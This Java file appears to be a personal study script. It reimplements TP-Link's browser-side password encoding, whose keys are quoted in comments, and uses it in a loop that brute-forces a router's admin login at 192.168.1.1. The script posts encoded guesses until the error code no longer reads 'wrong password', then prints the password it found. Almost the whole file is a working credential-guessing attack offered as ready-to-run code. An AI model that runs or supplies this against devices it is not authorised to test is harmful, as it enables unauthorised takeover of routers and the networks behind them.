package com.stone.study.tplink;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.stone.study.util.HttpRequestUtil;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

/**
 * Created by shitao on 2017/9/25.
 */
public class Test {

    /**
     * 字典
     */
    private static String[] chars = "0123456789abcdefghijklmnopkrstuvwxyzABCDEFGHIJKLMNOPKRSTUVWXYZ!@#$%^&*()_+-=`~?><,.".split("");


    /**
     * 模拟tplink 密码传输加密算法
     *
     * @param pwd
     * @return
     */
    public static String orgAuthPwd(String pwd) {
        //    function orgAuthPwd(a) {
        //        return this.securityEncode(a, "RDpbLfCPsJZ7fiv", "yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW")
        //    };
        //
        //    function securityEncode(a, c, b) {
        //        var d = "", e, f, g, h, k = 187, m = 187;
        //        f = a.length;
        //        g = c.length;
        //        h = b.length;
        //        e = f > g ? f : g;
        //        for (var l = 0; l < e; l++)m = k = 187, l >= f ? m = c.charCodeAt(l) :
        //                l >= g ? k = a.charCodeAt(l) : (k = a.charCodeAt(l), m = c.charCodeAt(l)), d += b.charAt((k ^ m) % h);
        //        return d
        //    };
        //{password: "0KccQbhc9TefbwK"}
        String c = "RDpbLfCPsJZ7fiv", b = "yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW";
        String d = "";
        int e, f, g, h, k = 187, m = 187;
        f = pwd.length();
        g = c.length();
        h = b.length();
        e = f > g ? f : g;

        for (int l = 0; l < e; l++) {
            m = k = 187;
            if (l >= f) {
                m = c.charAt(l);
            } else {
                if (l >= g) {
                    k = pwd.charAt(l);
                } else {
                    k = pwd.charAt(l);
                    m = c.charAt(l);
                }
            }
            d += b.charAt((k ^ m) % h);
        }
        return d;
    }

    public static void main(String[] args) {
        Set<String> set = genrateDictionary(3);
        for (String pwd : set) {
            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            String authPwd = orgAuthPwd(pwd);
            String jsonStr = "{method: \"do\", login: {password: \"" + authPwd + "\"}}";
            String responseStr = new HttpRequestUtil().postJsonRequestUrl("http://192.168.1.1", JSON.parseObject(jsonStr));
            System.err.println(responseStr);
            JSONObject responseJson = JSON.parseObject(responseStr);
            if (Integer.valueOf(responseJson.get("error_code") + "") == -40401) {
                System.out.println("密码错误！");
                continue;
            } else {
                System.out.println("密码已找到，为[" + pwd + "]");
                break;
            }
        }

    }

    public static Set<String> genrateDictionary(int len) {
        Set<String> set = new HashSet<String>();
        String str = null;
        int k = 1;
        int minLen = len;
        while (k <= 1000) {
            for (int j = 1; j < chars.length; j++) {
                len += 1;
                if (len > 32) {
                    break;
                }
                StringBuilder sb = new StringBuilder();
                for (int i = k; i < len; i++) {
                    sb.append(chars[i]);
                }
                System.out.println(sb.toString());
                set.add(sb.toString());
            }
            k++;
            len = minLen + k;
//            System.out.println(k);
        }
        return set;
    }
}
